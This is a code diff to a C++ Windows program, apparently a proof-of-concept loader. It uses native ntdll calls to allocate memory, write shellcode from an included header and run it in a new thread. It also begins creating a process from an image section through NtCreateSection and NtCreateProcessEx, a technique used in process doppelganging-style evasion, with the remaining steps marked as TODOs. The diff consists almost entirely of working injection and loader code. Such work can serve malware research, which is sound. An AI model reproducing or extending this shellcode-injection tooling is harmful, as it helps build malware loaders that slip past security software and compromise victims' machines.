@@ -5,14 +5,14 @@
 #include "peconv.h"
 #include "shellcodes.h"
 
-HANDLE run_shellcode_in_new_thread(HANDLE hProcess, LPVOID remote_shellcode_ptr)
+HANDLE run_in_new_thread(HANDLE hProcess, LPVOID entry_point)
 {
     HANDLE hMyThread = NULL;
     NTSTATUS status = ntdll_NtCreateThreadEx(&hMyThread,
         THREAD_ALL_ACCESS,
         NULL,
         hProcess,
-        (LPTHREAD_START_ROUTINE) remote_shellcode_ptr,
+        (LPTHREAD_START_ROUTINE) entry_point,
         NULL,
         0,
         0,
@@ -27,19 +27,57 @@ HANDLE run_shellcode_in_new_thread(HANDLE hProcess, LPVOID remote_shellcode_ptr)
     return hMyThread;
 }
 
-int main(int argc, char *argv[])
+HANDLE open_file(wchar_t* dummy_name)
 {
-    size_t ntdll_size = 0;
-    HMODULE ntdll_mod = load_ntdll(ntdll_size);
-    if (!init_ntdll_func(ntdll_mod)) {
-        std::cerr << "Init failed!" << std:: endl;
-        system("pause");
-        return -1;
+    HANDLE hFile = CreateFileW(dummy_name,
+        GENERIC_WRITE | GENERIC_READ,
+        0,
+        NULL,
+        OPEN_EXISTING,
+        FILE_ATTRIBUTE_NORMAL,
+        NULL
+    );
+    return hFile;
+}
+
+HANDLE create_process(HANDLE hFile)
+{
+    HANDLE hSection = nullptr;
+    NTSTATUS status = ntdll_NtCreateSection(&hSection,
+        SECTION_ALL_ACCESS,
+        NULL,
+        0,
+        PAGE_READONLY,
+        SEC_IMAGE,
+        hFile
+    );
+    if (status != STATUS_SUCCESS) {
+        std::cerr << "NtCreateSection failed" << std::endl;
+        return INVALID_HANDLE_VALUE;
     }
-    
-    HANDLE hProcess = ntdll_NtCurrentProcess();
+    HANDLE hProcess = nullptr;
+    status = ntdll_NtCreateProcessEx(
+        &hProcess, //ProcessHandle
+        PROCESS_ALL_ACCESS, //DesiredAccess
+        NULL, //ObjectAttributes
+        ntdll_NtCurrentProcess(), //ParentProcess
+        PS_INHERIT_HANDLES, //Flags
+        hSection, //sectionHandle
+        NULL, //DebugPort
+        NULL, //ExceptionPort
+        FALSE //InJob
+    );
+    if (status != STATUS_SUCCESS) {
+        std::cerr << "NtCreateProcessEx failed" << std::endl;
+        return INVALID_HANDLE_VALUE;
+    }
+    return hProcess;
+}
+
+bool run_shellcode(HANDLE hProcess)
+{
     PVOID base_addr = 0;
-    SIZE_T buffer_size = 0x200;
+    SIZE_T buffer_size = 0x1000;
     NTSTATUS status = ntdll_NtAllocateVirtualMemory(
         hProcess, 
         &base_addr, 0,
@@ -49,8 +87,7 @@ int main(int argc, char *argv[])
     );
     if (status != STATUS_SUCCESS) {
         std::cout << "Alloc failed!" << std::endl;
-        system("pause");
-        return -1;
+        return false;
     }
     std::cout << "Success" << std::endl;
     std::cout << base_addr << std::endl;
@@ -68,13 +105,47 @@ int main(int argc, char *argv[])
     status = ntdll_NtWriteVirtualMemory(hProcess, base_addr, shellcode_ptr, shellcode_size, nullptr);
     if (status != STATUS_SUCCESS) {
         std::cout << "Writing failed!" << std::endl;
+        return false;
+    }
+    HANDLE hThread = run_in_new_thread(hProcess, base_addr);
+    if (hThread != INVALID_HANDLE_VALUE) {
+        std::cout << "Created Thread, id " << std::hex <<  GetThreadId(hThread) << std::endl;
+        WaitForSingleObject(hThread, INFINITE);
+    }
+    return true;
+}
+
+bool run_new_process(wchar_t *path)
+{
+    HANDLE file = open_file(path);
+    if (file == INVALID_HANDLE_VALUE) {
+        std::cerr << "Opening file failed!" << std::endl;
+        return false;
+    }
+    HANDLE hProcess = create_process(file);
+    if (hProcess == INVALID_HANDLE_VALUE) {
+        std::cerr << "Creating process failed!" << std::endl;
+        return false;
+    }
+    //TODO: setup process parameters
+    //TODO2: run a thread inside the process
+    return true;
+}
+
+int main(int argc, char *argv[])
+{
+    size_t ntdll_size = 0;
+    HMODULE ntdll_mod = load_ntdll(ntdll_size);
+    if (!init_ntdll_func(ntdll_mod)) {
+        std::cerr << "Init failed!" << std:: endl;
         system("pause");
         return -1;
     }
-    HANDLE hThread = run_shellcode_in_new_thread(hProcess, base_addr);
-    if (hThread != INVALID_HANDLE_VALUE) {
-        std::cout << "Created Thread, id " << std::hex <<  GetThreadId(hThread);
-        WaitForSingleObject(hThread, INFINITE);
+
+    if (run_shellcode(ntdll_NtCurrentProcess())) {
+        std::cout <<"[+] Success" << std::endl;
     }
+    system("pause");
     return 0;
 }
+
